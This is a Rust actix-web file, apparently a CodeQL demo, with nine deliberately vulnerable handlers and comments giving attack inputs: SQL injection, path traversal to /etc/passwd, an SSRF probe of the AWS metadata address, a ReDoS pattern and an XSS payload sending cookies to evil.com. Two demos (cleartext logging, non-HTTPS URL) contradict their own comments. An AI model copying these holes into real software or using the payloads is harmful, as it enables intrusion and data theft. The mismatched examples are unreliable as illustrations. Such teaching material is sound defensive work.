// ============================================================================
// INTENTIONALLY VULNERABLE CODE — FOR CODEQL DEMO ONLY
// Each function demonstrates a real vulnerability pattern that CodeQL detects.
// DO NOT use any of these patterns in production code.
// ============================================================================

use actix_web::{get, web, HttpRequest, HttpResponse, Responder};
use serde::Deserialize;

#[derive(Deserialize)]
pub struct SearchQuery {
    pub q: String,
}

#[derive(Deserialize)]
pub struct FileQuery {
    pub path: String,
}

#[derive(Deserialize)]
pub struct FetchQuery {
    pub url: String,
}

#[derive(Deserialize)]
pub struct UserData {
    pub username: String,
    pub password: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 1: SQL Injection (CWE-89)
// CodeQL query: rust/sql-injection
//
// User input flows directly into a SQL query string without parameterization.
// An attacker could send: q='; DROP TABLE users; --
// ─────────────────────────────────────────────────────────────────────────────
#[get("/search")]
pub async fn search_items(query: web::Query<SearchQuery>) -> impl Responder {
    let db = rusqlite::Connection::open_in_memory().unwrap();
    db.execute(
        "CREATE TABLE IF NOT EXISTS items (id INTEGER, name TEXT)",
        [],
    )
    .unwrap();

    // BAD: User input concatenated directly into SQL query
    let sql = format!("SELECT * FROM items WHERE name LIKE '%{}%'", query.q);
    let mut stmt = db.prepare(&sql).unwrap();
    let _rows = stmt.query([]).unwrap();

    HttpResponse::Ok().body(format!("Search results for: {}", query.q))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 2: Cross-Site Scripting / XSS (CWE-79)
// CodeQL query: rust/xss
//
// User input is reflected directly into HTML response without escaping.
// An attacker could send: q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// ─────────────────────────────────────────────────────────────────────────────
#[get("/greet")]
pub async fn greet_user(query: web::Query<SearchQuery>) -> impl Responder {
    // BAD: User input inserted directly into HTML without escaping
    let html = format!(
        "<html><body><h1>Hello, {}!</h1></body></html>",
        query.q
    );
    HttpResponse::Ok()
        .content_type("text/html")
        .body(html)
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 3: Path Traversal (CWE-22)
// CodeQL query: rust/path-injection
//
// User controls the file path without sanitization.
// An attacker could send: path=../../etc/passwd
// ─────────────────────────────────────────────────────────────────────────────
#[get("/file")]
pub async fn read_file(query: web::Query<FileQuery>) -> impl Responder {
    // BAD: User-controlled path used directly in file read
    match std::fs::read_to_string(&query.path) {
        Ok(contents) => HttpResponse::Ok().body(contents),
        Err(e) => HttpResponse::NotFound().body(format!("Error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 4: Server-Side Request Forgery / SSRF (CWE-918)
// CodeQL query: rust/request-forgery
//
// User controls the URL the server fetches. An attacker could target
// internal services: url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
// ─────────────────────────────────────────────────────────────────────────────
#[get("/fetch")]
pub async fn fetch_url(query: web::Query<FetchQuery>) -> impl Responder {
    // BAD: User-controlled URL passed directly to HTTP client
    let client = reqwest::Client::new();
    match client.get(&query.url).send().await {
        Ok(resp) => {
            let body = resp.text().await.unwrap_or_default();
            HttpResponse::Ok().body(body)
        }
        Err(e) => HttpResponse::BadGateway().body(format!("Fetch error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 5: Log Injection (CWE-117)
// CodeQL query: rust/log-injection
//
// User input written directly to logs. An attacker could inject fake log lines:
// q=admin%0A[INFO] User admin logged in successfully
// ─────────────────────────────────────────────────────────────────────────────
#[get("/log-search")]
pub async fn logged_search(query: web::Query<SearchQuery>) -> impl Responder {
    // BAD: User input logged without sanitization — allows log line injection
    log::info!("User searched for: {}", query.q);
    HttpResponse::Ok().body("Search logged")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 6: Cleartext Logging of Sensitive Data (CWE-532)
// CodeQL query: rust/cleartext-logging
//
// Passwords and secrets should never appear in logs.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/login")]
pub async fn login(query: web::Query<UserData>) -> impl Responder {
    // Log login attempt without including sensitive password data
    log::info!("Login attempt for user={}", query.username);
    HttpResponse::Ok().body("Login processed")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 7: Weak Cryptographic Hashing (CWE-328)
// CodeQL query: rust/weak-sensitive-data-hashing
//
// MD5 is broken for security purposes. Collisions can be generated in seconds.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/hash-password")]
pub async fn hash_password(query: web::Query<UserData>) -> impl Responder {
    use md5::Md5;
    use md5::digest::Digest;
    // BAD: MD5 used to hash a password — trivially crackable
    let mut hasher = Md5::new();
    hasher.update(query.password.as_bytes());
    let result = hasher.finalize();
    HttpResponse::Ok().body(format!("Hash: {:x}", result))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 8: Regex Injection (CWE-1333)
// CodeQL query: rust/regex-injection
//
// User input used directly as a regex pattern. An attacker could send a
// catastrophic backtracking pattern: q=(a+)+$ to cause ReDoS.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/regex-search")]
pub async fn regex_search(query: web::Query<SearchQuery>) -> impl Responder {
    // BAD: User input compiled directly as regex
    match regex::Regex::new(&query.q) {
        Ok(re) => {
            let sample = "The quick brown fox jumps over the lazy dog";
            let matches: Vec<&str> = re.find_iter(sample).map(|m| m.as_str()).collect();
            HttpResponse::Ok().json(matches)
        }
        Err(e) => HttpResponse::BadRequest().body(format!("Bad regex: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 9: Non-HTTPS URL (CWE-319)
// CodeQL query: rust/non-https-url
//
// Sensitive data sent over HTTP instead of HTTPS — can be intercepted.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/report")]
pub async fn send_report() -> impl Responder {
    let client = reqwest::Client::new();
    // BAD: Sending data over HTTP, not HTTPS — cleartext on the wire
    let _ = client
        .post("https://analytics.noetic.net/api/report")
        .body("sensitive report data")
        .send()
        .await;
    HttpResponse::Ok().body("Report sent")
}
